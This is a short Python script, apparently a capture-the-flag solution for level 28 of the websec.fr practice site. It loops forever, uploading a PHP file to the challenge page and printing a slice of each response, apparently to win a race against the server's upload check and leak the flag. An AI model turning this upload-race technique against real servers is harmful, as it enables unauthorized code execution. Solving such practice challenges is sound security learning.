import requests

url = 'http://websec.fr/level28/index.php'
files = {'flag_file': open('28.php', 'rb'),'checksum':(None,'f'), 'submit':(None,'Upload and check')}

while True:
    response = requests.post(url, files=files)
    print(response.text[1604:1604+36])
